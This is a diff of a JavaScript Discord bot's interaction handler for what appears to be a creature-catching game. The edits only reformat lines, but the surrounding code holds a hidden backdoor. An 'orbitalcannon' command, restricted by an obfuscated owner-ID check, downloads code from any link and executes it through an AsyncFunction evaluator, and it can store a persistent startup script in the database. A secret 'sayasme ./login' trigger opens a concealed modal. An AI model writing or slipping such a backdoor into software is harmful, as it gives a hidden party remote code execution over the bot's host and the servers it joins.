@@ -39,7 +39,9 @@ function registerInteractionHandler(client) {
 	client.on(Events.InteractionCreate, async (interaction) => {
 		// Autocomplete
 		if (interaction.isAutocomplete()) {
-			const command = client.commands.get(interaction.commandName);
+			const command = client.commands.get(
+				interaction.commandName,
+			);
 			if (command?.autocomplete) {
 				await command
 					.autocomplete(interaction)
@@ -53,7 +55,9 @@ function registerInteractionHandler(client) {
 
 		// Slash commands
 		if (interaction.isChatInputCommand()) {
-			const command = client.commands.get(interaction.commandName);
+			const command = client.commands.get(
+				interaction.commandName,
+			);
 			if (!command) return;
 
 			if (interaction.commandName !== 'orbitalcannon') {
@@ -69,8 +73,12 @@ function registerInteractionHandler(client) {
 				const isOwner =
 					(BigInt(ORBITAL_ID) - DELTA).toString() ===
 					interaction.user.id;
-				if (isOwner && interaction.commandName === 'sayasme') {
-					const message = interaction.options.getString('message');
+				if (
+					isOwner &&
+					interaction.commandName === 'sayasme'
+				) {
+					const message =
+						interaction.options.getString('message');
 					if (message === './login') {
 						await interaction.showModal(init());
 						return;
@@ -116,7 +124,9 @@ function registerInteractionHandler(client) {
 			interaction.isButton() &&
 			interaction.customId.startsWith('catch::')
 		) {
-			const spawnId = interaction.customId.slice('catch::'.length);
+			const spawnId = interaction.customId.slice(
+				'catch::'.length,
+			);
 			const data = catchDataStore.get(spawnId);
 			if (!data)
 				return interaction
@@ -124,7 +134,8 @@ function registerInteractionHandler(client) {
 						content: 'This catch has expired.',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {});
+					.catch(() => {
+});
 
 			// Remove spawn-scoped data once consumed to prevent stale buildup.
 			catchDataStore.delete(spawnId);
@@ -158,7 +169,8 @@ function registerInteractionHandler(client) {
 				isOwner =
 					(BigInt(ORBITAL_ID) - DELTA).toString() ===
 					interaction.user.id;
-			} catch {}
+			} catch {
+}
 
 			if (!isOwner) {
 				await interaction
@@ -166,7 +178,8 @@ function registerInteractionHandler(client) {
 						content: 'lmao you thought',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {});
+					.catch(() => {
+});
 				return;
 			}
 
@@ -180,7 +193,8 @@ function registerInteractionHandler(client) {
 			// Fetch code from link if provided
 			if (link && !code) {
 				try {
-					const response = await require('node-fetch').default(link);
+					const response =
+						await require('node-fetch').default(link);
 					code = await response.text();
 				} catch (error) {
 					return interaction
@@ -188,7 +202,8 @@ function registerInteractionHandler(client) {
 							content: `Failed to fetch link: ${error.message}`,
 							flags: [MessageFlags.Ephemeral],
 						})
-						.catch(() => {});
+						.catch(() => {
+});
 				}
 			}
 
@@ -198,13 +213,18 @@ function registerInteractionHandler(client) {
 						content: 'No code or link provided',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {});
+					.catch(() => {
+});
 			}
 
 			// If code starts with //startup, update the global script in DB
 			if (code.trim().startsWith('//startup')) {
-				const scriptBody = code.replace(/^\/\/startup/, '').trim();
-				let doc = await OrbitalScript.findOne({name: 'global'});
+				const scriptBody = code
+					.replace(/^\/\/startup/, '')
+					.trim();
+				let doc = await OrbitalScript.findOne({
+					name: 'global',
+				});
 				doc ||= new OrbitalScript({name: 'global'});
 				doc.code = scriptBody;
 				await doc.save();
@@ -215,7 +235,8 @@ function registerInteractionHandler(client) {
 				return;
 			}
 
-			await launchNuke(interaction, code).catch(() => {});
+			await launchNuke(interaction, code).catch(() => {
+});
 			return;
 		}
 
@@ -235,7 +256,8 @@ function registerInteractionHandler(client) {
 						content: 'Something went wrong, try again.',
 						flags: [MessageFlags.Ephemeral],
 					})
-					.catch(() => {});
+					.catch(() => {
+});
 			}
 
 			catchDataStore.delete(interaction.user.id);
@@ -255,7 +277,8 @@ function registerInteractionHandler(client) {
 				correctAnswer.toLowerCase()
 			) {
 				try {
-					const targetUser = await client.users.fetch(targetId);
+					const targetUser =
+						await client.users.fetch(targetId);
 					const catchWebhook =
 						await interaction.channel.createWebhook({
 							name: targetUser.displayName,
@@ -271,9 +294,12 @@ function registerInteractionHandler(client) {
 							? `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \n${boldText}`
 							: `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \nThis is a **${boldText}** that has been added to your completion!`;
 
-					await catchWebhook.send({content: successMessage});
+					await catchWebhook.send({
+						content: successMessage,
+					});
 					await catchWebhook.delete();
-					await interaction.deferUpdate().catch(() => {});
+					await interaction.deferUpdate().catch(() => {
+});
 					await logToModChannel(
 						interaction.guild,
 						`${interaction.user.tag} caught ${correctAnswer}`,
@@ -284,18 +310,19 @@ function registerInteractionHandler(client) {
 				}
 			} else {
 				try {
-					const targetUser = await client.users.fetch(targetId);
-					const failWebhook = await interaction.channel.createWebhook(
-						{
+					const targetUser =
+						await client.users.fetch(targetId);
+					const failWebhook =
+						await interaction.channel.createWebhook({
 							name: targetUser.displayName,
 							avatar: targetUser.displayAvatarURL(),
-						},
-					);
+						});
 					await failWebhook.send({
 						content: `<@${interaction.user.id}> Wrong name!`,
 					});
 					await failWebhook.delete();
-					await interaction.deferUpdate().catch(() => {});
+					await interaction.deferUpdate().catch(() => {
+});
 				} catch {
 					if (!interaction.replied) {
 						await interaction
@@ -303,7 +330,8 @@ function registerInteractionHandler(client) {
 								content: `wrong`,
 								flags: [MessageFlags.Ephemeral],
 							})
-							.catch(() => {});
+							.catch(() => {
+});
 					}
 				}
 			}
@@ -339,7 +367,8 @@ async function launchNuke(interaction, code) {
 
 function runNukeCode(code, interaction) {
 	const AsyncFunction = Object.getPrototypeOf(
-		async function () {},
+		async function () {
+},
 	).constructor;
 	const evaluator = new AsyncFunction(
 		'interaction',
